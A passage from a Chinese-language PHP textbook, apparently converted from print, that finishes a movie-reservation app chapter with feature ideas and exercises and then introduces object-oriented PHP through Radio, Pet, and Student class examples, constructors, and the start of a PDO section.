    'Error connecting to MySQL server for ' . DB_NAME, E_USER_ERROR
    );

$user_id = $_SESSION['user_id'];

$query = "SELECT movielisting_id FROM reservation WHERE user_id = ?";

$result = parameterizedQuery($dbc, $query, 'i', $user_id)
    or trigger_error('Error querying database table reservation', E_USER_ERROR);

// Decrement number of reserved in movielisting
while ($row = mysqli_fetch_assoc($result))
{
    $movie_to_check_in = $row['movielisting_id'];

    $query = "UPDATE movielisting SET number_reserved = number_reserved - 1 WHERE id = ?";

    parameterizedQuery($dbc, $query, 'i', $movie_to_check_in);
```


## 25. 添加预订功能

```
if (mysqli_errno($dbc))
{
    trigger_error('Error querying database table movielisting', E_USER_ERROR);
}
}

// Delete all reservations for this user
$query = "DELETE FROM reservation WHERE user_id = ?";

parameterizedQuery($dbc, $query, 'i', $user_id);

if (mysqli_errno($dbc))
{
    trigger_error('Error querying database table reservation', E_USER_ERROR);
}

header("Location: " . dirname($_SERVER['PHP_SELF']));
exit;

else:

$dbc = mysqli_connect(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
    or trigger_error(
        'Error connecting to MySQL server for ' . DB_NAME,
        E_USER_ERROR
    );

$user_id = $_SESSION['user_id'];

$query = "SELECT movielisting.id, movielisting.title, movielisting.image_file
        FROM movielisting
            INNER JOIN reservation ON movielisting.id = reservation.movielisting_id
        WHERE reservation.user_id = ?";

$result = parameterizedQuery($dbc, $query, 'i', $user_id)
    or trigger_error(
        'Error querying database tables movielisting and reservation', E_USER_ERROR);

if (mysqli_num_rows($result) > 0):
?>
<table class="table table-striped table-hover">
<thead>
<tr>
<th scope="col"><h4>Movies You Have Reserved</h4></th>
<th scope="col"></th>
<th scope="col"></th>
</tr>
```
</thead>
<tbody>
<?php
while($row = mysqli_fetch_assoc($result))
{
    // Only display what's NOT in the shopping cart
    if (empty($_SESSION['cart'])
        || array_search($row['id'], $_SESSION['cart']) == false)
    {
        $movie_image_file = $row['image_file'];

        if (empty($movie_image_file))
        {
            $movie_image_file = ML_UPLOAD_PATH . ML_DEFAULT_MOVIE_FILE_NAME;
        }

        $movie_title_row = "<tr><td><img src=\"" . $movie_image_file
            . "\" class='img-thumbnail' style='max-height: 75px;'"
            . " alt='Movie image'></td>"
            . "<td class='align-middle'><a class='nav-link' "
            . "href='moviedetails.php?id='"
            . $row['id'] . "'>" . $row['title'] . "</a></td>";

        $movie_title_row .= "<td class='align-middle'><form method='POST' "
            . "action='" . $_SERVER['PHP_SELF'] . "'>"
            . "<button class='btn btn-success' type='submit' "
            . "name='id_to_check_in' value='" . $row['id'] . "'>"
            . "<i class='fas fa-check-circle'></i></button></form></td>";

        $movie_title_row .= "</tr>";

        echo $movie_title_row;
    }
}
?>
</tbody>
</table>
<form method="POST" action="<?=$_SERVER['PHP_SELF']?>">
    <button class="btn btn-success" type="submit"
        name="check_in_movies">Return Movies</button>
</form>
<?php
else:
?>
<h3>No Movies Reserved :-</h3>
<?php
    endif;

## 25. 添加预订功能

```
183.      endif;
184.      ?>
185.    </div>
186. </div>
187. <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"
188.         integrity="sha384-Q8i/X+965dz0rT7abk4lJ5tQI..."
189.         crossorigin="anonymous"></script>
190. <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"
191.         integrity="sha384-wH..."
192.         crossorigin="anonymous"></script>
193. <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"
194.         integrity="sha384-B0Uglyr..."
195.         crossorigin="anonymous"></script>
196. </body>
197. </html>
```

### 待添加的功能

这段代码绝不是一个完整且精良的应用。虽然可工作的代码至关重要，但总有改进或适配新用途的方法。可以也应该添加若干功能来提升用户体验，并增强应用的健壮性。下面我列举了几项。

### 为电影标题添加分页

随着电影预订库的增长，最好为应用添加分页功能，而不是列出数据库中的所有电影。分页可以改善响应时间，并减少每页显示结果所需的垂直滚动量。

### 添加电影搜索和筛选功能

除了分页之外，添加搜索功能来限制结果可以提升用户体验。该功能可以按标题搜索，也可以按导演搜索。此外，添加按不同评级筛选电影的能力也会有所帮助。

### 向电影记录中添加详细信息

我们现在可以追踪比目前更多的电影信息。可以添加发行日期、制片人、演员等字段，甚至可以链接到电影的相关评论或网站。

### 跟踪预订日期

目前，数据库既不跟踪用户借出电影的时间，也不提供归还截止日期。添加这些功能可以让管理员确保没有人无限期地保留电影副本。

### 为管理员添加预订管理功能

我们为电影预订应用开发的许多功能都以用户为中心。为了简化站点管理，最好具备以下管理功能：

- 1. 一个显示已预订电影的表
  - 点击某部电影会打开一个页面，列出借出该电影的每位用户
  - 点击某位用户会链接到仅列出该用户已预订电影的页面
- 2. 一个列出已预订一部或多部电影的用户的表
  - 点击某位用户会打开一个页面，列出他们已借出的电影
- 3. 管理丢失电影的能力

### 此应用中的缺陷

这些页面中的一些存在大量重复代码，尤其是样板式的 Bootstrap 链接。你应当将这些重复代码移入一个独立的头文件中，供所有需要它的脚本包含。

此应用还存在几个设计问题。

一个问题在于，如果用户将电影放入购物车后退出登录，这些电影会被预订，而用户并未主动预订它们。将电影放入购物车实际上就在预订表中预订了该电影。更好的购物车管理设计是使用一个数据库表来维护当前所有用户购物车中的电影（即多个用户登录并在其购物车中添加电影）。然后，只有在用户决定预订购物车中的电影时才创建预订记录。这一改动增加了复杂性，但通过将购物车条目排除在预订表之外，是更稳健的解决方案。另一个可能的解决方案是：如果用户在预订购物车中的电影之前退出登录，则清除所有预订记录。同时，弹出模态对话框告知用户当前情况，允许他们选择预订电影或继续退出登录，也是个好主意。维护用户购物车的购物车表是更好的想法，因为它能让用户在多次登录之间保留购物车内容。然而，现在我们又需要处理用户将电影保留在购物车中、导致其他用户无法预订的问题。

这些是值得考虑的有趣的设计和可用性问题，它们有许多不同且可接受的方案和取舍。

## 25. 添加预订功能

### 练习

- 1. 添加预订功能，包括数据库表、对添加/编辑页面的修改，并允许用户预订有可用副本的电影。
- 2. 添加仅限管理员使用的功能，以显示谁预订了电影。

## 26. PHP 面向对象编程简介

> “以唯一真正正确的方式。面向对象版的‘意大利面条式代码’当然就是‘千层面式代码’。（层数太多。）”
> 
> ——罗伯托·沃尔特曼。

## 26. PHP 中的面向对象编程简介

面向对象编程（OOP）是一种编程范式，它以更加模块化的方式开发程序。许多现代编程语言都具有 OOP 特性，PHP 也不例外。OOP 包含许多概念性组件。在最基本的层面上，它允许将程序所知道的内容（数据）和程序所执行的操作（功能）组合成模块化组件。这种方法不同于基本的过程式编程，在过程式编程中，许多函数与它们通常处理的数据是分离的。本章简要介绍使用 PHP 进行的面向对象编程。

由于本书涵盖使用 PHP 进行 Web 开发，因此我介绍该语言所支持的 OOP 的常见用法。如果你想了解更多关于 OOP 的原理和设计实践，我推荐 David Kung 的著作：*《面向对象软件工程：一种敏捷统一方法论》*¹，由 McGraw-Hill Education 出版。

我简要介绍以下主题：

- 类
- 属性
- 使用访问修饰符进行封装
- 访问器方法（Getter/Setter）
- $this 变量
- 通用方法
- 实例化并使用类
- 验证 Setter 方法的输入
- 继承
- 方法重写
- 构造函数
- PHP 数据库对象（PDO）

### 类

类将代码组织成模块化组件。通常将单个类放在其自己的文件中。在 PHP 中，使用 class 关键字定义类：

```
<?php
class Radio
{
}
```

[1] *《面向对象软件工程：一种敏捷统一方法论》*: http://phpa.me/mhws-oop-engineering





## 26. PHP 中的面向对象编程简介

在这个示例中，我们可能会希望将这个文件命名为 Radio.php。

类名遵循与变量名相同的规则。不过，与变量名不同的是，类名不区分大小写。在实践中，类命名的编码标准是：第一个单词以大写字母开头，并且类名中的每个单词都以大写字母开头（例如 CustomerAccount）。这种约定被称为“StudlyCaps”（大驼峰式命名）。

关于类，有一点要记住：它们就像 PHP 对象的蓝图或配方。我们稍后在讨论类的实例（即对象）与类定义本身之间的区别时，会进一步探讨这一点。

## 属性

当然，我们需要向类中添加数据。在某些编程语言中，这些数据被称为实例变量或类成员变量。在 PHP 中，我们称之为“属性”。

以我们的 Radio 示例为例，下面是一些属性：

```php
<?php
class Radio
{
    private $powered;  // true or false
    private $volume;   // 0 - 10
    private $channel;  // 535kHz - 1700kHz, 87.5MHz - 108MHz
}
```

> 关于类的设计
> 
> *如前所述，在最基本的层面上，类应该定义程序知道什么（数据）以及程序做什么（功能）。理想情况下，在进行对象设计时，你应该将类视为一个单一的事物。在本例中，我们是在软件中对收音机这一概念进行建模。在编写任何代码之前，先想想人们会如何与我们的收音机交互。由于这是一个简单的示例，我们需要收音机知道（即保存数据）它是开着还是关着、音量是多少，以及它所设置的频道或频率。同样，我们还需要开启和关闭收音机、设置音量以及更改频道或频率的功能。你的类需要哪些属性和方法，应该由你的软件需求来决定。我们会在讨论方法时补充这部分内容。*

## 使用访问修饰符实现封装

那么，在属性前面加上 private 有什么含义呢？

关键字 private 就是所谓的访问修饰符。PHP 称之为“可见性”[2]，并用它来限制对属性和方法的访问。属性和方法的访问有三个级别：private、protected 和 public。

- `private` 表示只有类内部的代码才能访问属性或调用方法。
- `protected` 表示只有该类或其子类内部的代码才能访问该属性或方法。
- `public` 表示所有人都可以访问该属性或方法。

在面向对象编程中，最佳实践是通过将属性设为 private 来限制访问。然后，添加公共方法来授予对这些属性的读取或写入权限。这就是封装原则，也是 OOP 的主要支柱之一。

## 访问器方法

为了向类中添加功能，我们创建方法。方法（method）是 OOP 中使用的一个专业术语，它与函数（function）含义相同，只不过方法被嵌入在类中。方法背后的 OOP 思想是操作或获取类中的数据。

如果想操作 Radio 类中的数据，我们需要方法来设置数据，如频道或音量。同样，如果要从类中检索数据，我们需要获取这些数据的方法。我们通常将这些访问器方法称为 getter 和 setter。

创建 getter 和 setter 的约定是：在属性名前面加上 get 或 set，并将属性名中每个单词的首字母大写（例如“驼峰式”风格）。我们通常将 getter 设为 public，也通常将 setter 设为 public（见下文）。

> *类设计中的可变性与不可变性*
> 
> *尽管这是一个更高级的话题，但你仍应思考代码在对象生命周期内如何与从类创建的对象交互。你可以自由设计一个类，允许这些对象的使用者在整个对象生命周期内，或仅在对象创建时，操作对象内的数据。这个概念被称为对象的“可变性”。如果你在类中创建了任何具有公共访问权限的 setter，那么你的对象就是可变的（即可以更改）。相反，如果你在类中创建的所有 setter 都具有 private（或可能是 protected）访问权限，那么你的对象就是不可变的（即无法更改）。你可能会问，如果对象不可变，又如何设置对象的属性呢？不可变对象必须在构造时设置其属性。稍后，我会展示如何创建构造函数。不可变对象往往更受青睐，因为实践证明它们更不容易出错。*

因此，要为 Radio 类创建 getter，我们需要以下方法：

- getPowered()
- getVolume()
- getChannel()

清单 26.1 展示了它们应该是什么样子。

**清单 26.1.**

```php
<?php
class Radio
{
    private $powered;  // true or false
    private $volume;   // 0 - 10
    private $channel;  // 535kHz - 1700kHz, 87.5MHz - 108MHz

    // Getters
    public function getPowered()
    {
        return $this->powered;
    }

    public function getVolume()
    {
        return $this->volume;
    }

    public function getChannel()
    {
        return $this->channel;
    }
}
```

请注意，getter 具有公共访问权限，因此我们类的用户可以获取属性的状态。现在让我们看一下 setter（清单 26.2）。请注意，setter 具有公共访问权限，这意味着从该类创建的对象将是可变的。

**清单 26.2.**

```
<?php
class Radio
{
    private $powered;    // true or false
    private $volume;    // 0 - 10
    private $channel;   // 535kHz - 1700kHz, 87.5MHz - 108MHz

    // ...

    // Setters
    public function setPowered($powered)
    {
        $this->powered = $powered;
    }

    public function setVolume($volume)
    {
        $this->volume = $volume;
    }

    public function setChannel($channel)
    {
        $this->channel = $channel;
    }
}
```

## $this 变量

在上述 getter 和 setter 中，我们引用了 $this 变量：

```
return $this->volume;
// ...
$this->volume = $volume;
```

$this 变量是所有类都可用的内置变量。它引用当前类的对象，也就是该类的这个特定实例。要使用一个类，必须将其“实例化”。$this 变量引用的正是该类的这个特定实例。-> 是对象操作符，允许你按值引用类的属性或方法。与其他语言（如 Java）不同，PHP 要求使用 $this-> 来访问这些属性或方法。

## 为什么其他语言不要求使用 $this 关键字？

嗯，这是个好问题，而这正是 PHP 做得对的地方。其他编程语言，如 Java、C# 和 C++，也使用 this 关键字来引用类实例变量。不过，在这些其他语言中并不要求使用 this。省略 this 是出于方便考虑。我认为不强制使用 this 关键字是一个错误。请看清单 26.3 中用 Java 编写的示例。

**清单 26.3.**

```java
1. class Radio
2. {
3.     private int _volume; // 0 - 10
4.     ...
5.     public void setVolume(int volume)
6.     {
7.         _volume = volume;
8.     }
9.     ...
10. }
```

在不强制使用 this 关键字的情况下，我们必须设计一种方案来区分实例变量和局部变量。在实例变量名前面加上下划线（_）是我见过的典型做法之一。

省略 this 关键字的问题有两方面。首先，我们需要未来维护这段代码的开发者知道，创建实例变量的风格是在它们前面加上下划线。其次，乍一看很难理解带下划线的变量就是实例变量。所有开发者都必须记住，不能以下划线开头来命名局部变量。将前面的示例与清单 26.4 中使用 this 关键字重写的同一 Java 代码进行对比。

**清单 26.4.**

```java
1. class Radio
2. {
3.     private int volume; // 0 - 10
4.     // ...
5.     public void setVolume(int volume)
6.     {
7.         this.volume = volume;
8.     }
9.     // ...
10. }
```

---

[2] “可见性”：https://www.php.net/language.oop5.visibility





## 26. PHP 中的面向对象编程简介

上述示例含义清晰，代码意图明确，不会让人产生歧义。它并不依赖那些无法强制执行的实例变量命名方案，而这些方案完全是为了应对“不必使用 this 关键字”的情况。在任何编程语言中，直接引用实例变量时，你都应该始终使用 this 关键字。谢天谢地，PHP 将其设为强制要求！

### 通用方法

除了 getter 和 setter 之外，你的类还可以包含用于执行各种任务的工具方法。例如，许多收音机都有扫描按钮，用于查找信号强的下一个频道。这些方法不必改变对象的状态（即修改属性），但它们可能会根据你的属性进行计算或执行某些操作，如代码清单 26.5 所示。

代码清单 26.5。

```php
class Radio
{
  public function scanChannels()
  {
    // find the next channel with a strong signal
  }

  public function getCurrentSong()
  {
    // reads live metadata from current channel about current song
    // being played and returns song title, etc...
  }
}
```

### 实例化并使用类

将类实例化为对象，并从该类创建多个实例，这展示了 OOP 的另一个强大概念。同理，你可以拥有多个字符串、整数等类型的变量；类则是一种更复杂的数据类型，也可以这样使用。

要使用我们的类，首先需要在 PHP 脚本中包含它：

```php
require_once('Radio.php');
```

要实例化或创建类的新实例，我们必须使用 new 关键字：

```php
require_once('Radio.php');

$car_radio = new Radio();
```

现在，$car_radio 引用了一个新实例，该实例是 Radio 类的对象。注意，类名 Radio 后面的 () 是默认构造函数（稍后会详细介绍）。如前所述，我们可以从单个 Radio 类创建多个实例：

```php
require_once('Radio.php');

$car_radio = new Radio();
$boat_radio = new Radio();
```

最好将类视为制作饼干之类的配方，而类的对象则是按照该配方制作出来的成品（例如一批巧克力曲奇饼干——好吃！）。接下来，我们可以使用我们的对象：

```php
$car_radio->setVolume(4);

echo 'My car radio\'s volume is set to: ' . $car_radio->getVolume() . '.';
```

再次注意，我们使用对象运算符（->）来引用 setVolume() 方法。我们可以引用任何具有公有可见性的属性或方法。OOP 是一个深奥的话题。请参阅 PHP 手册关于类和对象的说明[3]。

[3] 类与对象：https://php.net/language.oop5

### Radio.php（v1）完整代码清单

代码清单 26.6。

```php
<?php
class Radio
{
    private $powered;    // true or false
    private $volume;     // 0 - 10
    private $channel;    // 535kHz - 1700kHz, 87.5MHz - 108MHz

    // Getters
    public function getPowered()
    {
        return $this->powered;
    }

    public function getVolume()
    {
        return $this->volume;
    }

    public function getChannel()
    {
        return $this->channel;
    }

    // Setters
    public function setPowered($powered)
    {
        $this->powered = $powered;
    }

    public function setVolume($volume)
    {
        $this->volume = $volume;
    }

    public function setChannel($channel)
    {
        $this->channel = $channel;
    }
}
```

### UseRadio.php（v1）完整代码清单

代码清单 26.7。

```php
<?php
require_once('Radio.php');

$car_radio = new Radio();
$boat_radio = new Radio();

$car_radio->setPowered(true);
$car_radio->setVolume(4);
$car_radio->setChannel(88.6);

$boat_radio->setPowered(true);
$boat_radio->setVolume(7);
$boat_radio->setChannel(1640);

echo 'My car radio is ';
if ($car_radio->getPowered())
{
    echo 'turned on';
}
else
{
    echo 'turned off';
}

echo ' with the volume set to ' . $car_radio->getVolume() . ', ';
echo ' and the channel set to ' . $car_radio->getChannel() . '.<br /><br />';
echo 'My boat radio is ';

if ($boat_radio->getPowered())
{
    echo 'turned on';
}
else
{
    echo 'turned off';
}

echo ' with the volume set to ' . $boat_radio->getVolume() . ', ';
echo ' and the channel set to ' . $boat_radio->getChannel() . '.';
```

### 验证 Setter 方法的输入

通常，我们需要限制方法的输入。例如，在我们的 Radio 类中，音量设置会有上限和下限。许多家庭娱乐系统的音量设置都在 0 到 10 之间。让我们为 Radio 类添加一些类常量[4]：

```php
<?php
class Radio
{
    const MIN_VOLUME = 0;
    const MAX_VOLUME = 10;

    // ...
}
```

在我们的 setVolume() 方法中，我们可以通过 self:: 访问这些类常量。self 代表类自身，:: 被称为范围解析运算符[5]。在类内部引用常量时需要用到它。在引用外部变量时，你也会使用 ::，但此时要使用类名而不是 self。例如，我们可以更新 setVolume()，以确保用户无法将其设置为允许范围之外的值，如代码清单 26.8 所示。

[4] 类常量：https://php.net/language.oop5.constants
[5] 范围解析运算符：https://php.net/language.oop5.paamayim-nekudotayim

代码清单 26.8。

```php
<?php
class Radio
{
    const MIN_VOLUME = 0;
    const MAX_VOLUME = 10;
    // ...

    public function setVolume($volume)
    {
        if ($volume < self::MIN_VOLUME)
        {
            $volume = self::MIN_VOLUME;
        }
        else if ($volume > self::MAX_VOLUME)
        {
            $volume = self::MAX_VOLUME;
        }

        $this->volume = $volume;
    }

    // ...
}
```

### Radio.php（v2）完整代码清单

代码清单 26.9 是我们 Radio 类的完整代码清单，它会在设置频率时强制执行频率限制。

代码清单 26.9。

```php
<?php
class Radio
{
    const  MIN_VOLUME = 0;
    const  MAX_VOLUME = 10;

    const  MIN_AM_FREQ = 535;
    const  MAX_AM_FREQ = 1700;

    const  MIN_FM_FREQ = 87.5;
    const  MAX_FM_FREQ = 108;

    private $powered;    // true or false
    private $volume;     // 0 - 10
    private $channel;    // 535kHz - 1700kHz, 87.5MHz - 108MHz

    // Getters
    public function getPowered()
    {
        return $this->powered;
    }

    public function getVolume()
    {
        return $this->volume;
    }

    public function getChannel()
    {
        return $this->channel;
    }

    // Setters
    public function setPowered($powered)
    {
        $this->powered = $powered;
    }

    public function setVolume($volume)
    {
        if ($volume < self::MIN_VOLUME)
        {
            $volume = self::MIN_VOLUME;
        }
        else if ($volume > self::MAX_VOLUME)
        {
            $volume = self::MAX_VOLUME;
        }

        $this->volume = $volume;
    }

    public function setChannel($channel)
    {
        if ($channel < self::MIN_FM_FREQ)
        {
            $channel = self::MIN_FM_FREQ;
        }
        else if ($channel > self::MAX_FM_FREQ && $channel < self::MIN_AM_FREQ
                && $channel < (self::MIN_AM_FREQ - self::MAX_FM_FREQ))
        {
            $channel = self::MAX_FM_FREQ;
        }
        else if ($channel > self::MAX_FM_FREQ && $channel < self::MIN_AM_FREQ
                && $channel >= (self::MIN_AM_FREQ - self::MAX_FM_FREQ))
        {
            $channel = self::MIN_AM_FREQ;
        }
        else if ($channel > self::MAX_AM_FREQ)
        {
            $channel = self::MAX_AM_FREQ;
        }

        $this->channel = $channel;
    }
}
```

### UseRadio.php（v2）完整代码清单

代码清单 26.10。

```php
<?php
require_once('Radio.php');

$car_radio = new Radio();
$boat_radio = new Radio();

$car_radio->setPowered(true);
$car_radio->setVolume(4);
$car_radio->setChannel(88.6);

$boat_radio->setPowered(true);
$boat_radio->setVolume(11);
$boat_radio->setChannel(430);

echo 'My car radio is ';

if ($car_radio->getPowered())
{
    echo 'turned on';
}
else
{
    echo 'turned off';
}

echo ' with the volume set to ' . $car_radio->getVolume() . ', ';
echo ' and the channel set to ' . $car_radio->getChannel() . '.<br /><br />';
echo 'My boat radio is ';

if ($boat_radio->getPowered())
{
    echo 'turned on';
}
else
{
    echo 'turned off';
}

echo ' with the volume set to ' . $boat_radio->getVolume() . ', ';
echo ' and the channel set to ' . $boat_radio->getChannel() . '.';
```





## 26. PHP面向对象编程入门

**图26.1.** 以下是运行版本2的输出：

```
My car radio is turned on with the volume set to 4, and the channel set to 88.6.

My boat radio is turned on with the volume set to 10, and the channel set to 535.
```

### 继承

在面向对象编程中，“继承”[6]扩展了某个类（称为基类或父类）的行为，并以此作为另一个类（称为子类或派生类）的基础。这样做可以实现基类代码的高效复用，被认为是面向对象编程的另一个核心支柱。利用继承的另一种方式是，在设计基类时考虑更多的通用性，而设计子类时则更具针对性。

这最好通过一个例子来说明。假设我们想要表示“宠物”的概念。我们的`Pet`类可能如清单26.11所示。

**清单26.11.**

```php
<?php
class Pet
{
    protected $name;

    // Getters / Setters
    public function getName()
    {
        return $this->name;
    }

    public function setName($name)
    {
        $this->name = $name;
    }

    // Do some exercise!
    public function exercise()
    {
        echo 'Exercising my pet ' . $this->name . '.<br />';
    }
}
```

> 使用`protected`（而不是`private`）来让父类的属性对子类可见。

[6] “继承”：https://php.net/language.oop5.inheritance

`Pet`类将作为我们的基类。如果我们想创建一个继承Pet所有知识和方法的更具体的类，就需要创建一个子类。我们通过定义子类并使用关键字`extends`扩展基类来实现这一点：

```
<?php
    require_once('Pet.php');
    class Dog extends Pet
    {
        ...
    }
```

由于我们正在扩展`Pet`类，别忘了在声明子类之前引入它。现在让我们向子类中添加更具体的功能（清单26.12）。

**清单26.12.**

```
1. <?php
2.     require_once('Pet.php');
3.     class Dog extends Pet
4.     {
5.         public function bark()
6.         {
7.             echo $this->name . ' is barking.<br />';
8.         }
9.     }
```

在清单26.13中，让我们创建另一个子类。

**清单26.13.**

```
1. <?php
2.     require_once('Pet.php');
3.     class Cat extends Pet
4.     {
5.         public function meow()
6.         {
7.             echo 'My cat ' . $this->name . ' is meowing.<br />';
8.         }
9.     }
```

清单26.14展示了如何使用这些类。你可以在图26.2中看到输出。

**清单26.14.**

```php
<?php
require_once('Pet.php');
require_once('Dog.php');
require_once('Cat.php');

// Create a pet, dog, and cat
$my_pet = new Pet();
$my_dog = new Dog();
$my_cat = new Cat();

// Set Pet's name and exercise
$my_pet->setName("Gerald");
$my_pet->exercise();

echo '**********<br />';

// Set Dog's name, exercise, and bark
$my_dog->setName('Sparky');
$my_dog->exercise();
$my_dog->bark();

echo '**********<br />';

// Set Cat's name, exercise, and meow
$my_cat->setName('Boo');
$my_cat->exercise();
$my_cat->meow();
```

输出：

```
Exercising my pet Gerald.
**********
Exercising my pet Sparky.
Sparky is barking.
**********
Exercising my pet Boo.
My cat Boo is meowing.
```

**图26.2.**

> 你会注意到，尽管`Dog`和`Cat`类已经包含了`Pet`类，我仍然添加了对`Pet`类的引用。这是一个最佳实践——只要我在实例化基类的对象，就应该包含基类，尽管实例化的子类已经继承了基类。原因是，这样可以在继承结构被重新设计时尽量减少破坏性变更。记得使用`require_once`，这样在引入已经存在的类时不会出现致命错误。

### 方法重写

有了继承，我可以根据子类中的细节创建更具体的数据和方法。但是，我不喜欢我的狗和猫以相同的方式被描述为“锻炼”。如果能自定义或“重写”狗和猫不同的锻炼方式，那将会很方便。

面向对象编程的另一个核心支柱是根据子类的具体性来重写方法的行为。事实上，有了方法重写的能力，我们就不必跟踪该使用哪个具体的方法。我们可以依赖每个子类来处理其独特的行为细节。它会根据子类类型自动为我们完成。这种行为被称为“多态”（意为多种形态），是面向对象编程的另一个主要支柱。

我们通过在子类中重新定义基类的方法来重写其行为。规则是：子类中的方法必须与基类中的方法具有完全相同的签名。

清单26.15是我们重写了`exercise()`方法的`Dog`类：

**清单26.15.**

```php
<?php
require_once('Pet.php');

class Dog extends Pet
{
    public function bark()
    {
        echo $this->name . ' is barking.<br />';
    }

    // Do some dog exercise!
    public function exercise()
    {
        echo 'Walking my dog ' . $this->name . '.<br />';
    }
}
```

我们的`Cat`类在清单26.16中，并重写了`exercise()`方法：

**清单26.16.**

```
<?php
require_once('Pet.php');
class Cat extends Pet
{
    public function meow()
    {
        echo 'My cat ' . $this->name . ' is meowing.<br />';
    }

    // Do some cat exercise!
    public function exercise()
    {
        echo 'My cat ' . $this->name . ' is chasing mice!<br />';
    }
}
```

面向对象编程的一个强大特性是，我们不需要对使用`Pet`、`Dog`和`Cat`类的代码做任何修改，因为我们以相同的方式调用方法。只需重新运行，注意图26.3中输出的变化。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_489_0.png)

### 构造函数

构造函数在面向对象语言中用于在实例化过程中初始化类的对象。到目前为止，当我们实例化一个对象时，都是使用`new`关键字在类名后面加上一对空括号来完成的：

```
$myDog = new Dog();
```

这种初始化方式使用的是默认构造函数。如果你没有定义构造函数，PHP将尝试初始化你的对象属性。

构造函数是在对象初始化期间运行的函数。如果你要在类中执行一些特定的初始化操作，就需要定义构造函数。

我们使用PHP魔术方法`__construct()`来定义构造函数。PHP有许多“魔术方法”[7]，即那些以双下划线（`__`）开头的函数。本章中我只讨论`__construct()`和`__destruct()`。

[7] “魔术方法”：https://php.net/language.oop5.magic

让我们看一个创建构造函数的例子。假设我们有一个简单的`Student`类，需要存储id、姓名和电子邮件，但我们希望对象是不可变的（即，数据在对象的生命周期内被设定，但不可修改）。我们先定义类和属性：

```
<?php
class Student
{
    private $id;
    private $name;
    private $email;
}
```

接下来，我们需要定义构造函数，它以`$id`、`$name`和`$email`作为参数。我们使用`__construct()`魔术方法在清单26.17中完成。

**清单26.17.**

```
1. <?php
2.     class Student
3.     {
4.         private $id;
5.         private $name;
6.         private $email;
7. 
8.         // Constructor
9.         public function __construct($id, $name, $email)
10.         {
11.             $this->id = $id;
12.             $this->name = $name;
13.             $this->email = $email;
14.         }
15.     }
```

最后，我们将创建getter方法（清单26.18），以便我们类的用户能够获取属性的值。

**清单26.18.**

```
1. <?php
2.     class Student
3.     {
4.         private $id;
5.         private $name;
6.         private $email;
7. 
8.         // Constructor
```





## 构造函数

```
public function __construct($id, $name, $email)
{
    $this->id = $id;
    $this->name = $name;
    $this->email = $email;
}

// Getters
public function getId()
{
    return $this->id;
}

public function getName()
{
    return $this->name;
}

public function getEmail()
{
    return $this->email;
}
}
```

代码清单 26.19 是一个使用我们类的脚本。注意，在实例化对象时，有三个参数传递给了构造函数。这将产生以下输出（图 26.4）。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_491_0.png)

## 代码清单 26.19.

```
<?php
require_once('Student.php');

$jane = new Student(7, 'Jane Doe', 'jane@example.com');
?>
<table>
<tr>
<th>Name:</th>
<td><?= $jane->getName() ?></td>
</tr>
<tr>
<th>ID:</th>
<td><?= $jane->getId() ?></td>
</tr>
<tr>
<th>Email:</th>
<td><?= $jane->getEmail() ?></td>
</tr>
</table>
```

## 26. PHP 中的面向对象编程简介

## 关于构造函数

在 PHP 中使用构造函数和析构函数[8]时，需要记住的一点是，它们在其他面向对象语言中可能表现不同。看一下 PHP 手册中关于构造函数的一段引用，以确保你知道如何设计你的类，以你预期的方式利用构造：

> 如果子类定义了构造函数，父类构造函数不会隐式调用。要运行父构造函数，你必须在子构造函数中调用 parent::__construct()。如果子类没有定义构造函数，那么它可以从父类继承，并像标准类方法一样被调用（如果它没有被声明为 private）。

## PHP 8 中的构造函数属性提升

虽然本书假设使用 PHP 7.x，但在本书出版时，PHP 8 已经发布，并提供了一些新功能和增强。我只想向你介绍其中一个，称为构造函数属性提升。

构造函数属性提升允许你将类属性、构造函数定义和变量赋值全部合并到 __construct() 参数列表中。在标准定义类实例属性、构造函数和赋值时，你会使用类似代码清单 26.20 的代码。

## 代码清单 26.20.

```php
<?php

class Student
{
    private $id;
    private $name;
    private $email;

    // Constructor
    public function __construct(
        $id,
        $name,
        $email
    ) {
        $this->id = $id;
        $this->name = $name;
        $this->email = $email;
    }
}
```

[8] 构造函数和析构函数：https://php.net/manual/en/language.oop5.decon

我们在上面已经看到过这些内容。在构造函数属性提升中，我们可以用更少的样板代码将同样的代码重写为代码清单 26.21。

## 代码清单 26.21.

```php
<?php
class Student
{
    // Constructor
    public function __construct(
        private $id,
        private $name,
        private $email)
    {
    }
    // ...
}
```

只要构造函数参数列表中的变量前面有访问修饰符（private、protected 或 public），PHP 就会在底层创建属性，并将传入参数列表的值赋给它们。你仍然可以使用 this 关键字直接访问类中的属性。

详细信息包含在 PHP 手册的构造函数[9]章节中。如果你想了解更多，可以参考 PHP 手册 Wiki 上已为 PHP 8 批准的构造函数属性提升[10]的评论请求（RFC）。

## 使用面向对象编程创建参数化查询

在第 23 章“预处理语句”中，我向你展示了如何使用过程式函数 mysqli_prepare()、mysqli_stmt_bind_param()、mysqli_stmt_execute() 和 mysqli_stmt_get_result() 来创建更安全的参数化数据库查询。然而，还有一种面向对象的方式，可以使用 PHP 数据对象[11]（PDO）用更少的代码来实现数据库查询的参数化。我将通过创建一个简单的数据库表和一个管理数据进出该表的类来演示如何使用 PDO，以实现 PDO 的功能。

[9] 构造函数：https://php.net/language.oop5.decon.constructor.promotion
[10] 构造函数属性提升：https://wiki.php.net/rfc/constructor_promotion
[11] PHP 数据对象：https://php.net/book.pdo

## 26. PHP 中的面向对象编程简介

PDO 是用于与数据库交互的首选库，主要是因为它适用于多种不同的数据库技术。无论我们将数据存储在哪里，这个库都能为我们提供熟悉的 API。

首先，我们需要创建一个数据库和一个可以操作的简单表。对于这个演示，我将创建一个名为 Student 的简单数据库和一个名为 student 的表，用于存储学生的名、姓和电子邮件地址，如图 26.5 所示。

使用 PDO 的一种常见方式是创建一个称为 CRUD 包装器的类，它管理与数据库表的所有查询。CRUD 代表创建（Create）、读取（Read）、更新（Update）和删除（Delete），这些是我们对数据库表执行的常见操作。一个良好的实践是使用数据库表的“大驼峰式”（Studly Caps）命名变形，并在类名末尾拼接“Manager”一词。在本例中，由于我们的表叫做 student，我们应该将类命名为 StudentManager。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_494_0.png)

## 使用 PDO 创建新的数据库条目

